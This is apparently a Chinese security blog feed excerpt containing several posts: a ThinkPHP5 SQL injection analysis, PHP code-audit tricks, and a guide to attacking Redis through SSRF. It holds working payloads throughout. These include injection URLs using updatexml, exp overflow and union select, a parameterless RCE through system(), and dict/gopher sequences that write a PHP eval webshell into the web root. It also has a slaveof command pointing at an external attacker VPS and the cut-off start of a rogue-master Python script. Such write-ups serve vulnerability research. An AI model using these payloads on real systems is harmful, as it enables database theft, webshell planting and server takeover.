src="/img/tp5ldfxsqli_b.png"></p><p>全局搜索对应的<code>parseData</code>方法，看到可以由718行的<code>insert</code>方法或是由823行的<code>update</code>方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="comment">// 通过request助手函数的get方法，获取$_GET[&#x27;username&#x27;]的数据</span></span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        <span class="comment">// 通过db助手函数的insert方法，传入username数组（上面/a修饰符表示数组类型）</span></span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="comment">// 也可以通过update方法</span></span><br><span class="line">        <span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;,1)-&gt;update([&#x27;username&#x27; =&gt; $username]);</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>即对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，于是传入<code>username[0]=dec&amp;username[1]=a&amp;username[2]=1</code>进行动态调试，中间经过<code>parseKey</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_c.png"></p><p>显然<code>str_replace</code>函数是一个功能性函数，而并非是安全过滤函数，最终使得用户提供的数据被直接拼接进SQL语句中。</p><p>因为<code>username[0]</code>用于控制switch语句条件、<code>username[2]</code>会经过<code>floatval</code>函数强转，所以尝试通过<code>username[1]</code>传入报错注入Payload：</p><p><code>username[0]=dec&amp;username[1]=(extractvalue(1,concat(0x7e,(select user()),0x7e)))&amp;username[2]=1</code></p><p>得到报错：<code>1105 Only constant XPATH queries are supported</code>，XPATH系列用不了，换一种：</p><p><code>username[0]=dec&amp;username[1]=exp(~(select * from(select user())a))&amp;username[2]=1</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))-1) &quot;</code></p><p><img src="/img/tp5ldfxsqli_d.png"></p><p><code>update</code>方法类似就不再赘述了，需要注意的是官方修复时仅处理了<code>inc</code>和<code>dec</code>条件，但是并没有改动同样在switch语句中的<code>exp</code>条件，原因是当<code>username[0]</code>为<code>exp</code>时，会被<code>thinkphp/library/think/Request.php</code>中1096行的<code>filterExp</code>方法替换为<code>exp[空格]</code>，最终因为不满足switch语句的任意条件被结束。</p><h2 id="SQL注入2"><a href="#SQL注入2" class="headerlink" title="SQL注入2"></a>SQL注入2</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseArrayData方法，将未过滤的用户输入拼接进insert/insertAll/update语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.6&lt;=ThinkPHP&lt;=5.1.7、以及部分5.1.8</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;point&amp;username[1]&#x3D;a&amp;username[2]&#x3D;exp(~(select * from(select user())a))^&amp;username[3]&#x3D;a</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.13">5.1.9</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/39bb0fe6d50ee77e0779f646b10bce08c442a5e3">改进mysql驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_e.png"></p><p>直接删掉了<code>default</code>分支和<code>parseArrayData</code>方法。将源码版本更新为<code>5.1.17</code>，可以看到基本与SQL注入1逻辑相同。</p><p>全局搜索对应的<code>parseData</code>方法，看到可由1030行的<code>insert</code>方法、1063行的<code>insertAll</code>方法或是由1134行的<code>update</code>方法触发。需要编写的对应触发逻辑用SQL注入1的就行，而且多了一种触发方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// insertAll方法接收一个二维数组</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;insertAll([[<span class="string">&#x27;username&#x27;</span> =&gt; $username]]);</span><br></pre></td></tr></table></figure><p>跟一下变量的传递过程可知，<code>username</code>依然对应我们需要触发的那段逻辑中switch语句的<code>$val</code>，这次进入default分支跟进<code>parseArrayData</code>方法，看到需要让<code>username[0]</code>为<code>point</code>不然就会嗝屁：</p><p><img src="/img/tp5ldfxsqli_f.png"></p><p>因此传入<code>username[0]=point&amp;username[1]=a&amp;username[2]=b&amp;username[3]=c</code>进行动态调试，中间经过<code>parseData</code>等函数后最终生成的sql语句：</p><p><img src="/img/tp5ldfxsqli_g.png"></p><p>方便起见直接在<code>b</code>的位置传入报错注入Payload并闭合语句：</p><p><code>username[0]=point&amp;username[1]=a&amp;username[2]=exp(~(select * from(select user())a))^&amp;username[3]=a</code></p><p>最终拼接而成的SQL语句为：</p><p><code>&quot;INSERT INTO `users` (`username`) VALUES (exp(~(select * from(select user())a))^(&#39;a(a)&#39;)) &quot;</code></p><p><img src="/img/tp5ldfxsqli_h.png"></p><ul><li><code>update</code>和<code>insertAll</code>方法同理</li></ul><h2 id="SQL注入3"><a href="#SQL注入3" class="headerlink" title="SQL注入3"></a>SQL注入3</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseWhereItem方法，将未过滤完全的用户输入拼接进where语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.10</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username[0]&#x3D;not%20like&amp;username[1][0]&#x3D;%%&amp;username[1][1]&#x3D;anything&amp;username[2]&#x3D;)%20union%20select%20database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.0.14">5.0.11</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/495020b7b0c16de40f20b08f2ab3be0a2b816b96">改进Request类filterExp方法</a>这个commit，增加了对<code>not like</code>的过滤。</p><p><img src="/img/tp5ldfxsqli_j.png"></p><p>凡是使用框架提供的请求变量获取方法(Request类<code>param</code>方法及<code>input</code>助手函数)，都会经过这个<code>filterExp</code>方法的过滤。针对<code>not like</code>操作符，编写对应的<code>where</code>方法触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>相比前两个代码改动直接在漏洞点的补丁分析，这里的代码改动是在全局过滤函数的规则上，该如何根据这个变动敏感地嗅探到能被利用漏洞点呢？这是需要之后进一步思考的地方。</p><p>带着这个问题动态调试可以发现，输入流过程中有很多针对数组的解析函数，也会理解Payload要这样构造的原因：当然就是要满足一些if判断逻辑，让输入流进入到预期漏洞代码块了hhh（废话）</p><p><img src="/img/tp5ldfxsqli_k.png"></p><ul><li>因为PHP7的原因，需要调整一下implode函数的参数顺序</li></ul><p><img src="/img/tp5ldfxsqli_l.png"></p><p>一波拼接操作后生成的<code>whereStr</code>为<code>&quot;(`username` NOT LIKE &#39;%%&#39; ) UNION SELECT DATABASE(),USER()# `username` NOT LIKE &#39;anything&#39;)&quot;</code></p><p>这样就能让<code>username</code>字段匹配不到NULL之外的值避免占据回显点位，同时注释掉后面被implode函数合并进来的副作用语句，避免语法错误。</p><p>最终带入数据库执行的SQL语句为：</p><p><img src="/img/tp5ldfxsqli_m.png"></p><p>官方在个版本里新引入了<code>NOT LIKE</code>这个操作符，但是没加上对应的过滤规则导致了漏洞的产生。</p><h2 id="SQL注入4"><a href="#SQL注入4" class="headerlink" title="SQL注入4"></a>SQL注入4</h2><p>特定模式（<code>exp</code>）下的SQL语句执行：</p><p>影响版本：</p><ul><li>全版本</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;username&#x3D;) union select database(),user()%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>这里官方认为属于正常功能不作修复，因此不存在补丁更新对比。编写对应触发逻辑来调试分析一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">$result = db(<span class="string">&#x27;users&#x27;</span>)-&gt;where([<span class="string">&#x27;username&#x27;</span> =&gt; $username])-&gt;select();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p><img src="/img/tp5ldfxsqli_i.png"></p><p>流程与上一个洞类似就不赘述了，查看《ThinkPHP5.0完全开发手册》193页可以看到说明了<code>exp</code>模式就是用作SQL语法模式的，所以我个人觉得官方不认为这是一个漏洞也在情理之中。</p><h2 id="SQL注入5"><a href="#SQL注入5" class="headerlink" title="SQL注入5"></a>SQL注入5</h2><p>Builder类（thinkphp/library/think/db/Builder.php）的parseOrder方法，将未过滤的用户输入拼接进select/update/delete语句，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.1.16&lt;=ThinkPHP&lt;=5.1.22</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tpdemo&#x2F;public&#x2F;index.php?s&#x3D;&#x2F;index&#x2F;index&#x2F;index&amp;orderby[id&#96;|updatexml(1,concat(0x7e,(select user()),0x7e),1)%23]&#x3D;1</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-4"><a href="#漏洞分析-4" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.23</a>版本更新说明中表示改进了order方法的数组方式解析增强安全性，具体看到<a href="https://github.com/top-think/framework/commit/673e505421b25bdee2f02b668e5fd1ac79a3d190">改进order方法解析</a>这个commit</p><p><img src="/img/tp5ldfxsqli_n.png"></p><p>增加了对<code>)</code>和<code>#</code>符号的判断。将源码版本更新为<code>5.1.22</code>，全局搜索<code>parseOrder</code>方法，看到可以由1037行的select方法、1170行的update方法或是由1206行的delete方法触发。编写对应触发逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$orderby = request()-&gt;get(<span class="string">&#x27;orderby&#x27;</span>);</span><br><span class="line"><span class="comment">// $result = db(&#x27;users&#x27;)-&gt;where([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;])-&gt;order($orderby)-&gt;find();</span></span><br><span class="line"><span class="comment">// 也可以通过update方法，</span></span><br><span class="line"><span class="comment">// db(&#x27;users&#x27;)-&gt;where(&#x27;id&#x27;, 1)-&gt;order($orderby)-&gt;update([&#x27;username&#x27; =&gt; &#x27;hoschen&#x27;]);</span></span><br><span class="line"><span class="comment">// 还可以通过delete方法，支持XPATH系列函数</span></span><br><span class="line">db(<span class="string">&#x27;users&#x27;</span>)-&gt;where(<span class="string">&#x27;id&#x27;</span>, <span class="number">1</span>)-&gt;order($orderby)-&gt;delete();</span><br><span class="line">var_dump($result);</span><br></pre></td></tr></table></figure><p>这里传入Payload动态调试后可以发现拼接而成的SQL语句为：<code>&quot;DELETE FROM `users` WHERE  `id` = :where_AND_id ORDER BY `id`|updatexml(1,concat(0x7e,(select user()),0x7e),1)#` &quot; </code></p><p>为啥这里用的delete方法？因为在我的环境下前两种方法都会得到报错：<code>1105 Only constant XPATH queries are supported</code>，而通过exp等函数整数溢出报错也无效，希望知道原因的师傅指点我一下。</p><h2 id="SQL注入6"><a href="#SQL注入6" class="headerlink" title="SQL注入6"></a>SQL注入6</h2><p>聚合查询方法将未过滤的用户输入拼接进SQL语句中，存在SQL注入漏洞。</p><p>影响版本：</p><ul><li>5.0.0&lt;=ThinkPHP&lt;=5.0.21</li><li>5.1.3&lt;=ThinkPHP&lt;=5.1.25</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 5.1.11～5.1.25需要改为 id&#96;)</span><br><span class="line">id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</span><br></pre></td></tr></table></figure><h3 id="漏洞分析-5"><a href="#漏洞分析-5" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><a href="https://github.com/top-think/framework/releases?after=v5.1.30">5.1.26</a>版本更新说明中表示包含一个安全更新，具体看到<a href="https://github.com/top-think/framework/commit/26a1b2fe9571c151ccd5e7ad05b3bb33385ecde3">改进mysql驱动和sqlsrv驱动</a>这个commit</p><p><img src="/img/tp5ldfxsqli_o.png"></p><p>只允许字母、数字、下划线、点号、星号，不然抛出异常。</p><ul><li>因为对框架不熟悉，想根据这类补丁对比找出具体的漏洞发生点实在是困难，得多学习历史漏洞积累经验才行。这里也由于暂未复现成功，只能先搁置一下了</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/tree/master/ThinkPHP5">ThinkPHP-Vuln</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;基础设施&quot;&gt;&lt;a href=&quot;#基础设施&quot; class=&quot;headerlink&quot; title=&quot;基础设施&quot;&gt;&lt;/a&gt;基础设施&lt;/h2&gt;&lt;p&gt;大致扫一遍ThinkPHP官方的《完全开发手册》，知道有疑问时应该去哪个章节找就行。&lt;/p&gt;
&lt;ol start=&quot;0&quot;&gt;
</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="thinkphp" scheme="https://hosch3n.github.io/tags/thinkphp/"/>
    
    <category term="sqli" scheme="https://hosch3n.github.io/tags/sqli/"/>
    
  </entry>
  
  <entry>
    <title>PHP代码审计Tricks</title>
    <link href="https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/"/>
    <id>https://hosch3n.github.io/2020/10/15/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Tricks/</id>
    <published>2020-10-15T13:09:19.000Z</published>
    <updated>2020-12-07T14:43:53.840Z</updated>
    
    <content type="html"><![CDATA[<h2 id="反序列化调用不到类"><a href="#反序列化调用不到类" class="headerlink" title="反序列化调用不到类"></a>反序列化调用不到类</h2><p><img src="/img/phpdmsjtricks_a.png"></p><p>希望调用<code>ws.php</code>中<code>CLI\Agent</code>类的析构函数，但是传入<code>new CLI\Agent()</code>的序列化字符串后并未触发<code>die</code>标记，通过动态调试发现该框架此时会去寻找<code>lib/cli/agent.php</code>（但实际上是<code>Agent</code>类与<code>WS</code>类一起写在了<code>ws.php</code>中）</p><p><img src="/img/phpdmsjtricks_b.png"></p><p>解决方法是生成序列化字符串时，通过数组<code>array(new CLI\WS(), new CLI\Agent())</code>将两个类对象按顺序一同传入。这样虽然<code>autoload</code>包含<code>agent.php</code>同样会失败，但能够包含到<code>ws.php</code>也就能成功反序列化里面的<code>Agent</code>类。</p><ul><li>也看到了通过<code>new \CLI\WS(new \CLI\Agent())</code>的形式解决的</li></ul><h2 id="函数无参数RCE"><a href="#函数无参数RCE" class="headerlink" title="函数无参数RCE"></a>函数无参数RCE</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* HTTP Header</span></span><br><span class="line"><span class="comment">...</span></span><br><span class="line"><span class="comment">key: system(&#x27;ls -al&#x27;);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure><h2 id="链中的函数参数对应不上"><a href="#链中的函数参数对应不上" class="headerlink" title="链中的函数参数对应不上"></a>链中的函数参数对应不上</h2><p>通过PHP编写的一些自定义函数，如果一些非关键参数缺失或者多余其实影响不大。但是PHP的内置函数可能是因为由C实现的原因，兼容性就没那么高。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">PHP Parametric Function RCE</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;反序列化调用不到类&quot;&gt;&lt;a href=&quot;#反序列化调用不到类&quot; class=&quot;headerlink&quot; title=&quot;反序列化调用不到类&quot;&gt;&lt;/a&gt;反序列化调用不到类&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/img/phpdmsjtricks_a.png&quot;&gt;&lt;/p&gt;
&lt;</summary>
      
    
    
    
    <category term="Web安全" scheme="https://hosch3n.github.io/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
    <category term="php" scheme="https://hosch3n.github.io/tags/php/"/>
    
    <category term="unserialize" scheme="https://hosch3n.github.io/tags/unserialize/"/>
    
  </entry>
  
  <entry>
    <title>SSRF打Redis规避坏字符</title>
    <link href="https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/"/>
    <id>https://hosch3n.github.io/2020/09/25/SSRF%E6%89%93Redis%E8%A7%84%E9%81%BF%E5%9D%8F%E5%AD%97%E7%AC%A6/</id>
    <published>2020-09-24T16:43:14.000Z</published>
    <updated>2020-11-23T08:13:04.473Z</updated>
    
    <content type="html"><![CDATA[<p>用dict协议通过SSRF间接打Redis的时候，数据中存在<code>:</code>、<code>&#39;</code>等特殊字符会导致set失败，可以通过位运算、gopher协议、主从同步数据、主从同步文件等方式躲开坏字符的坑。</p><h2 id="位运算"><a href="#位运算" class="headerlink" title="位运算"></a>位运算</h2><p>对存在特殊字符的数据进行位运算，再在目标Redis上通过位运算将数据还原回来。<a href="https://redis.io/commands/bitop">举个栗子</a>：</p><p><img src="/img/ssrfdredisgbhzf_a.png"></p><ol start="0"><li>利用抑或的特性先set两个不会与dict协议冲突的字符串</li></ol><p><code>dict://127.0.0.1:6379/set:c:&quot;|\x7f&#125;%6!,hd\x1f\a\x05\x14\x1byqq\x1di&#123;\x7f~&quot;</code></p><p><code>dict://127.0.0.1:6379/set:b:&#39;@@@@@@@@@@@@@@@@@@@@@@&#39;</code></p><ol><li>再在目标上还原</li></ol><p><code>dict://127.0.0.1:6379/bitop:xor:a:b:c</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><p><img src="/img/ssrfdredisgbhzf_b.png"></p><h2 id="Gopher"><a href="#Gopher" class="headerlink" title="Gopher"></a>Gopher</h2><p>对redis-cli的命令数据抓包，利用gopher协议封装后重放给目标Redis。由于Redis的授权认证只有简单的一串<code>*2%0A%244%0Aauth%0A%248%0Afoobared</code>，且可以通过管道操作一次同时传输多条命令，因此这个方法还可以用来打知道密码的内网Redis。</p><ol start="0"><li>监听环回口6379端口并抓包</li></ol><p><code>sudo tcpdump port 6379 -i lo -w redis.pcap</code></p><p><img src="/img/ssrfdredisgbhzf_c.png"></p><ol><li>用gopher协议编码封装</li></ol><p><code>gopher://127.0.0.1:6379/_%244%0d%0aauth%0d%0a%248%0d%0afoobared%0d%0a*3%0d%0a%243%0d%0aset%0d%0a%241%0d%0aa%0d%0a%2422%0d%0a%3C%3F%3Deval(%24_GET%5B911%5D)%3B%3F%3E%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%243%0d%0adir%0d%0a%2414%0d%0a%2Fvar%2Fwww%2Fhtml%2F%0d%0a*4%0d%0a%246%0d%0aconfig%0d%0a%243%0d%0aset%0d%0a%2410%0d%0adbfilename%0d%0a%247%0d%0atmp.php%0d%0a*1%0d%0a%246%0d%0abgsave</code></p><ol start="2"><li>对数据体URL编码后发给目标</li></ol><p><code>?url=gopher://127.0.0.1:6379/_%25244%250d%250aauth%250d%250a%25248%250d%250afoobared%250d%250a*3%250d%250a%25243%250d%250aset%250d%250a%25241%250d%250aa%250d%250a%252422%250d%250a%253C%253F%253Deval(%2524_GET%255B911%255D)%253B%253F%253E%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%25243%250d%250adir%250d%250a%252414%250d%250a%252Fvar%252Fwww%252Fhtml%252F%250d%250a*4%250d%250a%25246%250d%250aconfig%250d%250a%25243%250d%250aset%250d%250a%252410%250d%250adbfilename%250d%250a%25247%250d%250atmp.php%250d%250a*1%250d%250a%25246%250d%250abgsave</code></p><p>如果嫌麻烦也可以用<a href="https://github.com/tarunkant/Gopherus">gopherus</a>交互式生成payload，同样需要二次编码后再打，<code>auth</code>开头的验证信息也要手动加一下</p><h2 id="主从同步数据"><a href="#主从同步数据" class="headerlink" title="主从同步数据"></a>主从同步数据</h2><p>将数据通过redis-cli写入VPS的Redis，让目标通过主从同步加载数据。</p><ol start="0"><li><p>在VPS上通过redis-cli写入数据</p></li><li><p>在目标上设置主从同步</p></li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="2"><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="3"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="4"><li>持久化保存</li></ol><p><code>dict://127.0.0.1:6379/bgsave</code></p><ol start="5"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><h2 id="主从同步文件"><a href="#主从同步文件" class="headerlink" title="主从同步文件"></a>主从同步文件</h2><p>r35tart师傅将Redis主从同步RCE的脚本 <a href="https://github.com/r35tart/RedisWriteFile">RedisWriteFile</a> 改了一下实现了无杂质写文件，这是一个主动连目标Redis打的脚本。</p><p>脚本耦合度不高只要把一些主动打的功能删掉就可以了，然后利用SSRF手动发包即可。</p><ol start="0"><li>准备要无损写的文件，在VPS上执行脚本</li></ol><p><code>python3 ssrf-redis-writefile.py --lhost=1.1.1.1 --lport=6379 --lfile=test.txt</code></p><ol><li>设置RDB文件的保存路径为Web根目录</li></ol><p><code>dict://127.0.0.1:6379/config:set:dir:/var/www/html/</code></p><ol start="2"><li>设置RDB文件的保存文件名</li></ol><p><code>dict://127.0.0.1:6379/config:set:dbfilename:tmp.php</code></p><ol start="3"><li>在目标上设置主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:1.1.1.1:6379</code></p><ol start="4"><li>断开主从同步</li></ol><p><code>dict://127.0.0.1:6379/slaveof:no:one</code></p><p>如果要用过认证或者是希望一把梭打完，就抓下包封装下gopher协议，道理是一样的。</p><blockquote><p>但是在Redis中，为了防止http协议对Redis端口的攻击，它如果检测到”POST”或者”Host:”，就会中断这次连接，并且在日志中留下这行，我们可以通过添加%00绕过<br>但是Redis是一边判断一边逐行执行，所以只要在读到”Host:”之前把需要的操作做完即可，所以不加也没关系</p></blockquote><ul><li>附脚本</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> optparse <span class="keyword">import</span> OptionParser</span><br><span class="line"></span><br><span class="line">CLRF = <span class="string">&quot;\r\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author: hosch3n</span></span><br><span class="line"><span class="string">Reference: https://github.com/r35tart/RedisWriteFile/</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_cmd</span>(<span class="params">cmd</span>):</span></span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;*&quot;</span>):</span><br><span class="line">        raw_arr = cmd.strip().split(<span class="string">&quot;\r\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> raw_arr[<span class="number">2</span>::<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> cmd.startswith(<span class="string">&quot;$&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> cmd.split(<span class="string">&quot;\r\n&quot;</span>, <span class="number">2</span>)[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> cmd.strip().split(<span class="string">&quot; &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>(<span class="params">msg</span>):</span></span><br><span 